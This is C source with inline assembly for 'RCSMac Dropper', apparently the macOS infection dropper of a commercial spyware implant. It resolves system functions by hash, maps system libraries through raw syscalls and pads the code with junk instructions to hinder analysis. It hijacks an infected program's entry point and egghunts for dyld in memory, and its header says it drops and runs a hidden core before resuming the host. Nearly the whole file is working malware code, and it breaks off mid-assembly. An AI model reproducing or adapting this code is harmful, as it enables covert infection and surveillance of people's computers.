/*
* RCSMac Dropper - Dropper Component
*  - API resolution
*    - get dyld_image_count/dyld_get_image_name/dyld_get_image_header from
*      dyld in memory
*      - Look for LC_SYMTAB and get all the symbols from there
*    - cycle through all the loaded images in memory looking for libSystem
*    - once found, get all the other symbols (c standard library)
*      - Same method as dyld -> LC_SYMTAB
*  - Get all the resources info, drop the files and execute the RESOURCE_CORE
*  - Jump to the original entry point
*
* Created by Alfredo 'revenge' Pesoli on 24/07/2009
* Win32 porting by Massimo Chiodini on 02/11/2009
* Refactored & fixed by Guido Landi on 14/03/2012
* Copyright (C) HT srl 2009. All rights reserved
*
*/

#include <stdio.h>
#include <sys/stat.h>

#include "RCSMacCommon.h"
#include "RCSMacDropper.h"

#define DYLD32_IMAGE_BASE 0x8FE
#define DYLD64_IMAGE_BASE 0x7fff6 // 0000000

#define O_RDWR          0x0002
#define O_CREAT         0x0200
#define O_TRUNC         0x0400
#define	O_EXCL          0x0800
#define RTLD_DEFAULT    ((void *) - 2)

#define	PROT_READ       0x01    // [MC2] pages can be read
#define	PROT_WRITE      0x02    // [MC2] pages can be written
#define	MAP_SHARED      0x0001  // [MF|SHM] share changes


//#define LOADER_DEBUG

void dropperStart ()
{
	int a = 5;
}

void doExit ()
{
#ifdef WIN32
	__asm__ __volatile__ {
		xor		eax,eax
			push	eax
			inc		eax
			push	eax
			int		0x80
	}  
#else
	__asm__ __volatile__ (
		"xorl %eax, %eax\n"
		"push %eax\n"
		"inc %eax\n"
		"push %eax\n"
		"int $0x80\n"
		);
#endif
}

static unsigned int
sdbm (unsigned char *str)
{
	int c;
	unsigned long hash = 0;

	while ((c = *str++))
		hash = c + (hash << 6) + (hash << 16) - hash;

	return hash;
}

unsigned int
findSymbolInFatBinary (byte *imageBase, unsigned int symbolHash)
{
	
#ifdef LOADER_DEBUG
	printf("[ii] findSymbolInFatBinary!\n");
#endif

	if (imageBase == 0x0)
	{
#ifdef LOADER_DEBUG
		printf("[ee] Exiting (imageBase is 0)\n");
#endif
		doExit();
	}

	struct mach_header *mh_header       = NULL;
	struct load_command *l_command      = NULL; 
	struct nlist *sym_nlist             = NULL; 
	struct symtab_command *sym_command  = NULL;
	struct segment_command *seg_command = NULL;
	struct fat_header *f_header         = NULL;
	struct fat_arch *f_arch             = NULL;
	char *symbolName = NULL;
	int offset, symbolOffset, stringOffset, x86Offset, found;
	unsigned int i, nfat;

	__asm {
		push eax
			pop eax
			mov eax, eax
			add eax, 0
			mov ebx, ebx
			push ecx
			mov ecx, ecx
			pop ecx
	}

	offset = found = 0;
	f_header = (struct fat_header *)imageBase;

	__asm {
		push eax
			pop eax
			mov eax, eax
			add eax, 0
			mov ebx, ebx
			push ecx
			mov ecx, ecx
			pop ecx
	}

	offset += sizeof (struct fat_header);
	nfat = SWAP_LONG (f_header->nfat_arch);

#ifdef LOADER_DEBUG
	printf("[ii] magic: %x\n", f_header->magic);
	printf("[ii] nFatArch: %d\n", nfat);
#endif

	__asm {
		push eax
			pop eax
			mov eax, eax
			add eax, 0
			mov ebx, ebx
			push ecx
			mov ecx, ecx
			pop ecx
	}


	for (i = 0; i < nfat; i++)
	{
		__asm {
			push eax
				pop eax
				mov eax, eax
				add eax, 0
				mov ebx, ebx
				push ecx
				mov ecx, ecx
				pop ecx
		}
		f_arch = (struct fat_arch *)(imageBase + offset);
		int cpuType = SWAP_LONG (f_arch->cputype);
		__asm {
			push eax
				pop eax
				mov eax, eax
				add eax, 0
				mov ebx, ebx
				push ecx
				mov ecx, ecx
				pop ecx
		}
		if (cpuType == 0x7)
			break;
		__asm { 
			mov eax, eax 
				push ecx 
				pop ecx 
				mov ecx, ecx 
		}
		offset += sizeof (struct fat_arch);
	}

	x86Offset = SWAP_LONG (f_arch->offset);
#ifdef LOADER_DEBUG
	printf ("[ii] x86 offset: %x\n", x86Offset);
#endif
	__asm {
		push eax
			pop eax
			mov eax, eax
			add eax, 0
			mov ebx, ebx
			push ecx
			mov ecx, ecx
			pop ecx
	}
	offset = x86Offset;
	mh_header = (struct mach_header *)(imageBase + offset); 
	__asm {
		push eax
			pop eax
			mov eax, eax
			add eax, 0
			mov ebx, ebx
			push ecx
			mov ecx, ecx
			pop ecx
	}
	offset += sizeof (struct mach_header);

#ifdef LOADER_DEBUG
	printf("imageBase in findSymbolFat: %x\n", mh_header);
#endif

#ifdef LOADER_DEBUG
	printf("[ii] ncmdsFat: %d\n", mh_header->ncmds);
#endif

	for (i = 0; i < mh_header->ncmds; i++)
	{
		__asm {
			push eax
				pop eax
				mov eax, eax
				add eax, 0
				mov ebx, ebx
				push ecx
				mov ecx, ecx
				pop ecx
		}
		l_command = (struct load_command *)(imageBase + offset);

#ifdef LOADER_DEBUG
		printf("[ii] cmdFat: %d\n", l_command->cmd);
#endif

		if (l_command->cmd == LC_SEGMENT)
		{
			__asm {
				push eax
					pop eax
					mov eax, eax
					add eax, 0
					mov ebx, ebx
					push ecx
					mov ecx, ecx
					pop ecx
			}
			if (found)
			{
				__asm {
					push eax
						pop eax
						mov eax, eax
						add eax, 0
						mov ebx, ebx
						push ecx
						mov ecx, ecx
						pop ecx
				}
				offset += l_command->cmdsize;
				__asm {
					push eax
						pop eax
						mov eax, eax
						add eax, 0
						mov ebx, ebx
						push ecx
						mov ecx, ecx
						pop ecx
				}
				continue;
			}
			__asm {
				push eax
					pop eax
					mov eax, eax
					add eax, 0
					mov ebx, ebx
					push ecx
					mov ecx, ecx
					pop ecx
			}
			seg_command = (struct segment_command *)(imageBase + offset);

#ifdef LOADER_DEBUG
			printf("[ii] segNameFat: %s\n", seg_command->segname);
#endif

			if (sdbm ((unsigned char *)seg_command->segname) == linkeditHash)
				found = 1;
			__asm { 
				mov eax, eax 
					push ecx 
					pop ecx 
					mov ecx, ecx 
			}
		}
		else if (l_command->cmd == LC_SYMTAB)
		{
			__asm {
				push eax
					pop eax
					mov eax, eax
					add eax, 0
					mov ebx, ebx
					push ecx
					mov ecx, ecx
					pop ecx
			}
			sym_command = (struct symtab_command *)(imageBase + offset);

			if (found)
				break;
			__asm {
				push eax
					pop eax
					mov eax, eax
					add eax, 0
					mov ebx, ebx
					push ecx
					mov ecx, ecx
					pop ecx
			}
		}
		__asm {
			push eax
				pop eax
				mov eax, eax
				add eax, 0
				mov ebx, ebx
				push ecx
				mov ecx, ecx
				pop ecx
		}
		offset += l_command->cmdsize;
	}

	__asm {
		push eax
			pop eax
			mov eax, eax
			add eax, 0
			mov ebx, ebx
			push ecx
			mov ecx, ecx
			pop ecx
	}
	symbolOffset = x86Offset + sym_command->symoff;
	stringOffset = x86Offset + sym_command->stroff;

#ifdef LOADER_DEBUG
	printf("[ii] offsetFat: %x\n", offset);
	printf("[ii] stringOffsetFat: %x\n", stringOffset);
	printf("[ii] nSymsFat: %d\n", sym_command->nsyms);
#endif

	for (i = 0; i < sym_command->nsyms; i++)
	{
		__asm {
			push eax
				pop eax
				mov eax, eax
				add eax, 0
				mov ebx, ebx
				push ecx
				mov ecx, ecx
				pop ecx
		}
		sym_nlist = (struct nlist *)(imageBase + symbolOffset);
		symbolOffset += sizeof (struct nlist);
		__asm {
			push eax
				pop eax
				mov eax, eax
				add eax, 0
				mov ebx, ebx
				push ecx
				mov ecx, ecx
				pop ecx
		}
		if (sym_nlist->n_un.n_strx == 0x0)
		{
			__asm {
				push eax
					pop eax
					mov eax, eax
					add eax, 0
					mov ebx, ebx
					push ecx
					mov ecx, ecx
					pop ecx
			}

			continue;
		}
		__asm { 
			mov eax, eax 
				push ecx 
				pop ecx 
				mov ecx, ecx 
		}
		symbolName  = (char *)(imageBase + sym_nlist->n_un.n_strx + stringOffset);

		__asm {
			push eax
				pop eax
				mov eax, eax
				add eax, 0
				mov ebx, ebx
				push ecx
				mov ecx, ecx
				pop ecx
		}

#ifdef LOADER_DEBUG_VERBOSE
		printf ("[ii] SYMBOLFat: %s\n", symbolName);
#endif

		if (sdbm((unsigned char *)symbolName) == symbolHash)
		{
#ifdef LOADER_DEBUG
			printf ("[ii] Symbol Found\n");
			printf ("[ii] SYMBOLFat: %s\n", symbolName);
			printf ("[ii] addressFat: %x\n", sym_nlist->n_value);
#endif
			__asm {
				push eax
					pop eax
					mov eax, eax
					add eax, 0
					mov ebx, ebx
					push ecx
					mov ecx, ecx
					pop ecx
			}
			return sym_nlist->n_value;
		}
	}

	return -1;
}

unsigned int
findSymbol_snow (byte *imageBase, unsigned int symbolHash)
{
	
	struct mach_header *mh_header       = NULL;
	struct load_command *l_command      = NULL; 
	struct nlist *sym_nlist             = NULL; 
	struct symtab_command *sym_command  = NULL;
	struct segment_command *seg_command = NULL;

	char *symbolName = NULL;

	int offset, found, stringOffset; 

	unsigned int hash, i;

	offset = found = 0; 
	mh_header = (struct mach_header *)imageBase; 
	offset += sizeof (struct mach_header);

	for (i = 0; i < mh_header->ncmds; i++)
	{
		l_command = (struct load_command *)(imageBase + offset); 

		if (l_command->cmd == LC_SEGMENT)
		{
			if (found)
			{
				offset += l_command->cmdsize;
				continue;
			}

			seg_command = (struct segment_command *)(imageBase + offset);

			if (sdbm ((unsigned char *)seg_command->segname) == linkeditHash)
				found = 1;
		}
		else if (l_command->cmd == LC_SYMTAB)
		{
			sym_command = (struct symtab_command *)(imageBase + offset); 

			if (found)
				break;
		}

		offset += l_command->cmdsize;
	}

	offset = sym_command->symoff - seg_command->fileoff + seg_command->vmaddr;
	stringOffset = sym_command->stroff - seg_command->fileoff + seg_command->vmaddr; 

	for (i = 0; i < sym_command->nsyms; i++)
	{
		sym_nlist = (struct nlist *)offset;
		offset += sizeof (struct nlist);

		symbolName = (char *)(sym_nlist->n_un.n_strx + stringOffset);
		hash = sdbm ((unsigned char *)symbolName);

#ifdef LOADER_DEBUG_VERBOSE
		printf ("[ii] SYMBOL: %s\n", symbolName);
#endif
		if (hash == symbolHash)
		{
#ifdef LOADER_DEBUG
			printf ("[ii] Symbol Found\n");
			printf ("[ii] SYMBOL: %s\n", symbolName);
			printf ("[ii] address: %x\n", sym_nlist->n_value);
#endif
			return sym_nlist->n_value;
		}
	}
	return -1;
	
}

unsigned int
findSymbol_lion(byte *imageBase, unsigned int symbolHash)
{
	struct mach_header *mh_header       = NULL;
	struct load_command *l_command      = NULL; 
	struct nlist *sym_nlist             = NULL; 
	struct symtab_command *sym_command  = NULL;
	struct segment_command *seg_command = NULL;

	char *symbolName = NULL;

	int offset, found, stringOffset;

	unsigned int hash, i;

	offset = found = 0; 
	mh_header = (struct mach_header *)imageBase;
	offset += sizeof (struct mach_header);

	for (i = 0; i < mh_header->ncmds; i++)
	{
		l_command = (struct load_command *)(imageBase + offset); 

		if (l_command->cmd == LC_SEGMENT)
		{
			if (found)
			{
				offset += l_command->cmdsize;
				continue;
			}

			seg_command = (struct segment_command *)(imageBase + offset);

			if (sdbm ((unsigned char *)seg_command->segname) == linkeditHash)
			{
				found = 1;
			}
		}
		else if (l_command->cmd == LC_SYMTAB)
		{
			sym_command = (struct symtab_command *)(imageBase + offset); 

			if (found)
			{
				break;
			}
		}

		offset += l_command->cmdsize;
	}

	unsigned int linkeditVmaddr;
	unsigned int dyldBase;

	//
	// Fow now we hardcode the vmaddr for the linkedit segment in dyld
	// the right thing to do would be parsing the binary on disk
	// Parse __TEXT and get vmaddr
	// Parse __LINKEDIT and get vmaddr
	// __LINKEDIT->vmaddr - __TEXT->vmaddr = memory displacement
	// then randomized base + memory displacement = randomized __LINKEDIT position
	//
	//if (sizeof(long) == 8) // 64bit
	//{
	//linkeditVmaddr = (unsigned int)imageBase + 0x71000;
	//dyldBase = DYLD64_IMAGE_BASE << 40;
	//}
	if (sizeof(long) == 4) // 32bit
	{
		linkeditVmaddr = (unsigned int)imageBase + 0x5e000;
		dyldBase = DYLD32_IMAGE_BASE << 20;
	}

	offset = sym_command->symoff - seg_command->fileoff + linkeditVmaddr;
	stringOffset = sym_command->stroff - seg_command->fileoff + linkeditVmaddr;

	for (i = 0; i < sym_command->nsyms; i++)
	{
		sym_nlist = (struct nlist *)offset;
		offset += sizeof (struct nlist);

		symbolName = (char *)(sym_nlist->n_un.n_strx + stringOffset);
		hash = sdbm ((unsigned char *)symbolName);

#ifdef DEBUG
		printf ("[ii] SYMBOL: %s\n", symbolName);
#endif
		if (hash == symbolHash)
		{
#ifdef DEBUG
			printf ("[ii] Symbol Found\n");
			printf ("[ii] SYMBOL: %s\n", symbolName);
			printf ("[ii] address: %x\n", sym_nlist->n_value);
#endif

			unsigned int sym_offset = sym_nlist->n_value - dyldBase;
			sym_offset += (unsigned int)imageBase;

			return sym_offset;
		}
	}

	return -1;
}

void *mapLibSystem() 
{
	//
	// since struct stat on win32 is half the size of the unix counterpart
	// declare it twice for padding the damn ebp :>
	//
	struct stat pad;
	struct stat mSt;

	void *address;
	int fd;
	int err;

	//fd = open("/usr/lib/libSystem.B.dylib", O_RDONLY);
#ifdef WIN32
	__asm__ __volatile__ {
		sub esp, 0x80
			push 0x00006269
			push 0x6c79642e
			push 0x422e6d65
			push 0x74737953
			push 0x62696c2f
			push 0x62696c2f
			push 0x7273752f
			mov edx, esp
			push 0x0
			push edx
			xor eax, eax
			mov al, 0x5
			push eax
			int 0x80
			mov [fd], eax
	}
#else
	__asm__ __volatile__ (
		"subl	$52, %%esp\n"
		"pushl $0x00006269\n"
		"pushl $0x6c79642e\n"
		"pushl $0x422e6d65\n"
		"pushl $0x74737953\n"
		"pushl $0x62696c2f\n"
		"pushl $0x62696c2f\n"
		"pushl $0x7273752f\n"
		"movl	%%esp, %%edx\n"
		"pushl $0x0\n"
		"pushl %%edx\n"
		"xorl %%eax, %%eax\n"
		"movb $5, %%al\n"
		"pushl %%eax\n"
		"int $0x80\n"
		"movl %%eax, %0"
		:"=m"(fd) 
		:
	);
#endif

	if (fd == -1)
		return (NULL);

	//err = fstat(fd, &st);
#ifdef WIN32
	__asm__ __volatile__ {
		lea eax, [pad]
		mov DWORD PTR [esp+0x4], eax // struct stat
			mov eax, [fd]
		mov DWORD PTR [esp], eax     // fd
			xor eax, eax
			mov al, 189
			push eax
			int 0x80
			mov [err], eax
	}
#else
	__asm__ __volatile__ (
		"leal %2, %%eax\n"
		"movl %%eax, 4(%%esp)\n"
		"movl %1, %%eax\n"
		"movl %%eax, (%%esp)\n" 
		"xorl %%eax, %%eax\n"
		"movb $189, %%al\n"
		"pushl %%eax\n"
		"int $0x80\n"
		"movl %%eax, %0"
		:"=m"(err)
		:"m"(fd), "m"(st)
		);
#endif

	if (err != 0)
		return (NULL);

	//ret = mmap(0, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
#ifdef WIN32
	__asm__ __volatile__ {
		mov DWORD PTR [esp+24], 0
			mov DWORD PTR [esp+20], 0
			mov eax, [fd]
		mov DWORD PTR [esp+16], eax
			mov DWORD PTR [esp+12], 2       // MAP_PRIVATE
			mov DWORD PTR [esp+8], 1        // PROT_READ
			mov eax, [ebp-0x30]             // st.st_size (win ~46 bytes, osx ~96 bytes)
		mov DWORD PTR [esp+4], eax
			mov DWORD PTR [esp], 0
			xor eax, eax
			mov al, 197
			push eax
			int 0x80
			mov [address], eax
	}
#else
	__asm__ __volatile__ (
		"movl	$0, 24(%%esp)\n"
		"movl	$0, 20(%%esp)\n"
		"movl	%2, %%eax\n"
		"movl	%%eax, 16(%%esp)\n"
		"movl	$2, 12(%%esp)\n"
		"movl	$1, 8(%%esp)\n"
		"movl	%1, %%eax\n"
		"movl	%%eax, 4(%%esp)\n"
		"movl	$0, (%%esp)\n"
		"xorl	%%eax, %%eax\n"
		"movb	$197, %%al\n"
		"pushl	%%eax\n"
		"int	$0x80\n"
		"mov	%%eax, %0\n"
		:"=m"(address)
		:"m"(st.st_size), "m"(fd)
		);
#endif

	return address;
}

void *mapLibDyld() 
{
	//
	// since struct stat on win32 is half the size of the unix counterpart
	// declare it twice for padding the damn ebp :>
	//
	struct stat pad;
	struct stat mSt;

	void *address;
	int fd;
	int err;

	//fd = open("/usr/lib/system/libdyld.dylib", O_RDONLY);
#ifdef WIN32
	__asm__ __volatile__ {
		sub esp, 0x84
			push 0x00000062
			push 0x696c7964
			push 0x2e646c79
			push 0x6462696c
			push 0x2f6d6574
			push 0x7379732f
			push 0x62696c2f
			push 0x7273752f
			mov edx, esp
			push 0x0
			push edx
			xor eax, eax
			mov al, 0x5
			push eax
			int 0x80
			mov [fd], eax
	}
#else
	__asm__ __volatile__ (
		"subl	$52, %%esp\n"
		"pushl $0x00006269\n"
		"pushl $0x6c79642e\n"
		"pushl $0x422e6d65\n"
		"pushl $0x74737953\n"
		"pushl $0x62696c2f\n"
		"pushl $0x62696c2f\n"
		"pushl $0x7273752f\n"
		"movl	%%esp, %%edx\n"
		"pushl $0x0\n"
		"pushl %%edx\n"
		"xorl %%eax, %%eax\n"
		"movb $5, %%al\n"
		"pushl %%eax\n"
		"int $0x80\n"
		"movl %%eax, %0"
		:"=m"(fd) 
		:
	);
#endif

	if (fd == -1)
		return (NULL);

	//err = fstat(fd, &st);
#ifdef WIN32
	__asm__ __volatile__ {
		lea eax, [pad]
		mov DWORD PTR [esp+0x4], eax // struct stat
			mov eax, [fd]
		mov DWORD PTR [esp], eax     // fd
			xor eax, eax
			mov al, 189
			push eax
			int 0x80
			mov [err], eax
	}
#else
	__asm__ __volatile__ (
		"leal %2, %%eax\n"
		"movl %%eax, 4(%%esp)\n"
		"movl %1, %%eax\n"
		"movl %%eax, (%%esp)\n" 
		"xorl %%eax, %%eax\n"
		"movb $189, %%al\n"
		"pushl %%eax\n"
		"int $0x80\n"
		"movl %%eax, %0"
		:"=m"(err)
		:"m"(fd), "m"(st)
		);
#endif

	if (err != 0)
		return (NULL);

	//ret = mmap(0, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
#ifdef WIN32
	__asm__ __volatile__ {
		mov DWORD PTR [esp+24], 0
			mov DWORD PTR [esp+20], 0
			mov eax, [fd]
		mov DWORD PTR [esp+16], eax
			mov DWORD PTR [esp+12], 2       // MAP_PRIVATE
			mov DWORD PTR [esp+8], 1        // PROT_READ
			mov eax, [ebp-0x30]             // st.st_size (win ~46 bytes, osx ~96 bytes)
		mov DWORD PTR [esp+4], eax
			mov DWORD PTR [esp], 0
			xor eax, eax
			mov al, 197
			push eax
			int 0x80
			mov [address], eax
	}
#else
	__asm__ __volatile__ (
		"movl	$0, 24(%%esp)\n"
		"movl	$0, 20(%%esp)\n"
		"movl	%2, %%eax\n"
		"movl	%%eax, 16(%%esp)\n"
		"movl	$2, 12(%%esp)\n"
		"movl	$1, 8(%%esp)\n"
		"movl	%1, %%eax\n"
		"movl	%%eax, 4(%%esp)\n"
		"movl	$0, (%%esp)\n"
		"xorl	%%eax, %%eax\n"
		"movb	$197, %%al\n"
		"pushl	%%eax\n"
		"int	$0x80\n"
		"mov	%%eax, %0\n"
		:"=m"(address)
		:"m"(st.st_size), "m"(fd)
		);
#endif

	return address;
}

void *mapLibSystemC() 
{
	//
	// since struct stat on win32 is half the size of the unix counterpart
	// declare it twice for padding the damn ebp :>
	//
	struct stat pad;
	struct stat mSt;

	void *address;
	int fd;
	int err;

	//fd = open("/usr/lib/system/libsystem_c.dylib", O_RDONLY);
#ifdef WIN32
	__asm__ __volatile__ {
		sub esp, 0x88
			push 0x00000062
			push 0x696c7964
			push 0x2e635f6d
			push 0x65747379
			push 0x7362696c
			push 0x2f6d6574
			push 0x7379732f
			push 0x62696c2f
			push 0x7273752f
			mov edx, esp
			push 0x0
			push edx
			xor eax, eax
			mov al, 0x5
			push eax
			int 0x80
			mov [fd], eax
	}
#else
	__asm__ __volatile__ (
		"subl	$52, %%esp\n"
		"pushl $0x00006269\n"
		"pushl $0x6c79642e\n"
		"pushl $0x422e6d65\n"
		"pushl $0x74737953\n"
		"pushl $0x62696c2f\n"
		"pushl $0x62696c2f\n"
		"pushl $0x7273752f\n"
		"movl	%%esp, %%edx\n"
		"pushl $0x0\n"
		"pushl %%edx\n"
		"xorl %%eax, %%eax\n"
		"movb $5, %%al\n"
		"pushl %%eax\n"
		"int $0x80\n"
		"movl %%eax, %0"
		:"=m"(fd) 
		:
	);
#endif

	if (fd == -1)
		return (NULL);

	//err = fstat(fd, &st);
#ifdef WIN32
	__asm__ __volatile__ {
		lea eax, [pad]
		mov DWORD PTR [esp+0x4], eax // struct stat
			mov eax, [fd]
		mov DWORD PTR [esp], eax     // fd
			xor eax, eax
			mov al, 189
			push eax
			int 0x80
			mov [err], eax
	}
#else
	__asm__ __volatile__ (
		"leal %2, %%eax\n"
		"movl %%eax, 4(%%esp)\n"
		"movl %1, %%eax\n"
		"movl %%eax, (%%esp)\n" 
		"xorl %%eax, %%eax\n"
		"movb $189, %%al\n"
		"pushl %%eax\n"
		"int $0x80\n"
		"movl %%eax, %0"
		:"=m"(err)
		:"m"(fd), "m"(st)
		);
#endif

	if (err != 0)
		return (NULL);

	//ret = mmap(0, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
#ifdef WIN32
	__asm__ __volatile__ {
		mov DWORD PTR [esp+24], 0
			mov DWORD PTR [esp+20], 0
			mov eax, [fd]
		mov DWORD PTR [esp+16], eax
			mov DWORD PTR [esp+12], 2       // MAP_PRIVATE
			mov DWORD PTR [esp+8], 1        // PROT_READ
			mov eax, [ebp-0x30]             // st.st_size (win ~46 bytes, osx ~96 bytes)
		mov DWORD PTR [esp+4], eax
			mov DWORD PTR [esp], 0
			xor eax, eax
			mov al, 197
			push eax
			int 0x80
			mov [address], eax
	}
#else
	__asm__ __volatile__ (
		"movl	$0, 24(%%esp)\n"
		"movl	$0, 20(%%esp)\n"
		"movl	%2, %%eax\n"
		"movl	%%eax, 16(%%esp)\n"
		"movl	$2, 12(%%esp)\n"
		"movl	$1, 8(%%esp)\n"
		"movl	%1, %%eax\n"
		"movl	%%eax, 4(%%esp)\n"
		"movl	$0, (%%esp)\n"
		"xorl	%%eax, %%eax\n"
		"movb	$197, %%al\n"
		"pushl	%%eax\n"
		"int	$0x80\n"
		"mov	%%eax, %0\n"
		:"=m"(address)
		:"m"(st.st_size), "m"(fd)
		);
#endif

	return address;
}

void *mapLibSystemK() 
{
	//
	// since struct stat on win32 is half the size of the unix counterpart
	// declare it twice for padding the damn ebp :>
	//
	struct stat pad;
	struct stat mSt;

	void *address;
	int fd;
	int err;

	//fd = open("/usr/lib/system/libsystem_kernel.dylib", O_RDONLY);
#ifdef WIN32
	__asm__ __volatile__ {
		sub esp, 0x92
			push 0x00006269
			push 0x6c79642e
			push 0x6c656e72
			push 0x656b5f6d
			push 0x65747379
			push 0x7362696c
			push 0x2f6d6574
			push 0x7379732f
			push 0x62696c2f
			push 0x7273752f
			mov edx, esp
			push 0x0
			push edx
			xor eax, eax
			mov al, 0x5
			push eax
			int 0x80
			mov [fd], eax
	}
#else
	__asm__ __volatile__ (
		"subl	$52, %%esp\n"
		"pushl $0x00006269\n"
		"pushl $0x6c79642e\n"
		"pushl $0x422e6d65\n"
		"pushl $0x74737953\n"
		"pushl $0x62696c2f\n"
		"pushl $0x62696c2f\n"
		"pushl $0x7273752f\n"
		"movl	%%esp, %%edx\n"
		"pushl $0x0\n"
		"pushl %%edx\n"
		"xorl %%eax, %%eax\n"
		"movb $5, %%al\n"
		"pushl %%eax\n"
		"int $0x80\n"
		"movl %%eax, %0"
		:"=m"(fd) 
		:
	);
#endif

	if (fd == -1)
		return (NULL);

	//err = fstat(fd, &st);
#ifdef WIN32
	__asm__ __volatile__ {
		lea eax, [pad]
		mov DWORD PTR [esp+0x4], eax // struct stat
			mov eax, [fd]
		mov DWORD PTR [esp], eax     // fd
			xor eax, eax
			mov al, 189
			push eax
			int 0x80
			mov [err], eax
	}
#else
	__asm__ __volatile__ (
		"leal %2, %%eax\n"
		"movl %%eax, 4(%%esp)\n"
		"movl %1, %%eax\n"
		"movl %%eax, (%%esp)\n" 
		"xorl %%eax, %%eax\n"
		"movb $189, %%al\n"
		"pushl %%eax\n"
		"int $0x80\n"
		"movl %%eax, %0"
		:"=m"(err)
		:"m"(fd), "m"(st)
		);
#endif

	if (err != 0)
		return (NULL);

	//ret = mmap(0, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
#ifdef WIN32
	__asm__ __volatile__ {
		mov DWORD PTR [esp+24], 0
			mov DWORD PTR [esp+20], 0
			mov eax, [fd]
		mov DWORD PTR [esp+16], eax
			mov DWORD PTR [esp+12], 2       // MAP_PRIVATE
			mov DWORD PTR [esp+8], 1        // PROT_READ
			mov eax, [ebp-0x30]             // st.st_size (win ~46 bytes, osx ~96 bytes)
		mov DWORD PTR [esp+4], eax
			mov DWORD PTR [esp], 0
			xor eax, eax
			mov al, 197
			push eax
			int 0x80
			mov [address], eax
	}
#else
	__asm__ __volatile__ (
		"movl	$0, 24(%%esp)\n"
		"movl	$0, 20(%%esp)\n"
		"movl	%2, %%eax\n"
		"movl	%%eax, 16(%%esp)\n"
		"movl	$2, 12(%%esp)\n"
		"movl	$1, 8(%%esp)\n"
		"movl	%1, %%eax\n"
		"movl	%%eax, 4(%%esp)\n"
		"movl	$0, (%%esp)\n"
		"xorl	%%eax, %%eax\n"
		"movb	$197, %%al\n"
		"pushl	%%eax\n"
		"int	$0x80\n"
		"mov	%%eax, %0\n"
		:"=m"(address)
		:"m"(st.st_size), "m"(fd)
		);
#endif

	return address;

}

void labelTest ()
{
}

void secondStageDropper (unsigned long args)
{
	unsigned int fd;
	hijack_context *h_context = (hijack_context *)&args; // "context" saved by pushad

	unsigned long _eax = h_context->eax;
	unsigned long _ecx = h_context->ecx;
	unsigned long _edx = h_context->edx;
	unsigned long _ebx = h_context->ebx;
	unsigned long _esp = h_context->esp;
	unsigned long _ebp = h_context->ebp;
	unsigned long _esi = h_context->esi;
	unsigned long _edi = h_context->edi;

	int crtStartSize = 54;
	const char *imageName   = NULL;
	void *baseAddress       = NULL;
	void *libSystemAddress  = NULL;
	void *dyldBaseAddress   = NULL;
	int imageCount, z       = 0;
	void *infectionBase     = NULL;

#ifdef WIN32
	sigaction new_act = {0};
	sigaction old_act = {0};
	u32_sigaction sig = {0};
	unsigned int sig_handler;	
	unsigned char file_buffer[1024];
	int osx_version, file_handle, read_len, i;

	sig_handler = osx_version = file_handle = read_len = i = 0;

	__asm__ __volatile__ {
		mov eax, [ebp+0x4]			// retaddr
		sub eax, 0xD3				// infection base is 0xd3 bytes before retaddr

		mov [infectionBase], eax	

		jmp get_pc
init:
		pop eax
		mov [sig_handler], eax

		jmp l_out
get_pc:
		call init

		// this is weird, depending on some stars allignment the context's
		// offset changes and so we just scan the stack for a register we 
		// know it's not changed by the kernel(ebp)
sig_handler:
		mov eax, esp
sig_loop:
		add eax, 0x4
		cmp [eax], ebp
		jne sig_loop

		add eax, 0x4
		mov esp, eax
		// now esp points to the faulting ESP value
		// in the middle of the thread context

		sub [esp], 4		// make room for retaddr
		mov eax, [esp]		

		mov ebx, [esp+0xc]	// ebx == faulting EIP
		add ebx, 8			// add to EIP to jump over CMP & JE of egghunter !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
		mov [eax], ebx		// save retaddr

			// restore registers & return back to the egghunter
		mov eax, [esp-0x1c]
		mov ebx, [esp-0x18]
		mov ecx, [esp-0x14]
		mov edx, [esp-0x10]
		mov esi, [esp-0xc]
		mov edi, [esp-0x8]
		mov ebp, [esp-0x4]
		mov esp, [esp]
		ret					

l_out:
	}

	// FIN QUI TUTTOK

	sig.sig_action = 0x41414141;
	sig.sig_tramp	= sig_handler;
	sig.sig_flags	= 0x70;	// SA_SIGINFO|SA_NODEFER|SA_NOCLDWAIT

	// install sig_handler
	__asm__ __volatile__ {
		lea eax, [sig]

		mov eax, eax 
			push ecx 
			pop ecx 
			mov ecx, ecx 

			push 0x0
			push eax		// &sig
			push 0xb		// SIGSEGV

			mov eax, eax 
			push ecx 
			pop ecx 
			mov ecx, ecx 

			mov eax, 0x2e	// SYS_sigaction
			push eax
			int 0x80
			add esp, 0x10
	}
	// egghunter: scans for the first 0xfeedface from 
	// 0x8fe00000 to 0x8fff0000
	__asm__ __volatile__ {
		mov eax, 0x8fe00000
l_loop:
		cmp DWORD PTR [eax], 0xfeedface
		je found
		add eax, 0x1000
		cmp eax, 0x8fff1000
		jne l_loop
		mov DWORD PTR [dyldBaseAddress], 0x0
		jmp l_break
found:
		mov DWORD PTR [dyldBaseAddress], eax
l_break:
		nop
	}

	char SystemVersion[49] = {'/', 'S', 'y', 's', 't', 'e', 'm', '/', 'L', 'i', 'b', 'r', 'a', 'r', 'y', '/', 'C', 'o', 'r', 'e', 'S', 'e', 'r', 'v', 'i', 'c', 'e', 's', '/', 'S', 'y', 's', 't', 'e', 'm', 'V', 'e', 'r', 's', 'i', 'o', 'n', '.', 'p', 'l', 'i', 's', 't', 0x0};
	// find macosx version
	__asm__ __volatile__ {
		push 0
		push SystemVersion
		mov eax, 0x5
		push eax
		int 0x80
		mov [file_handle], eax
		//add esp, 0x40
		add esp, 0xc
	}

	if(file_handle <= 0)
		goto OEP_CALL;
	// read file
	__asm__ __volatile__ {
		push 0x400
		lea eax, [file_buffer]
		push eax
		mov eax, [file_handle]
		push eax
		mov eax, 0x3

		push eax
		int 0x80
		mov [read_len], eax

		add esp, 0x10
	}

	if(read_len <= 0)
		goto OEP_CALL;

	// homebrew plist parsing FTW!
	while(*(unsigned int *)&file_buffer[i++] != 0x696c702f && read_len > i) // "/pli"
		if(*(unsigned int *)&file_buffer[i] == 0x2e30313e) // ">10."
		{
			if (file_buffer[i+4] == 0x36)
				osx_version = 1;
			else if(file_buffer[i+4] == 0x37)
				osx_version = 2;

			break;
		}

#else
	__asm__ __volatile__ (
		"movl 4(%%ebp), %%eax\n"
